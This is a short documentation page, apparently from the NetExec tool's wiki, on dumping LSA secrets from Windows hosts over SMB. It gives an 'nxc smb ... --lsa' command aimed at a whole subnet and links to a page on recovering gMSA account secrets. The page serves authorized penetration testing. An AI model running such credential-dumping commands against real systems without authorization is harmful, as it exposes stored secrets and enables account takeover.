# Dump LSA

### Dump LSA secrets using methods from secretsdump.py

{% hint style="danger" %}
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
{% endhint %}

```
#~ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa
```

If you found an account starting with _SC\_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} you can get the account behind:

{% content-ref url="../../ldap-protocol/extract-gmsa-secrets.md" %}
[extract-gmsa-secrets.md](../../ldap-protocol/extract-gmsa-secrets.md)
{% endcontent-ref %}
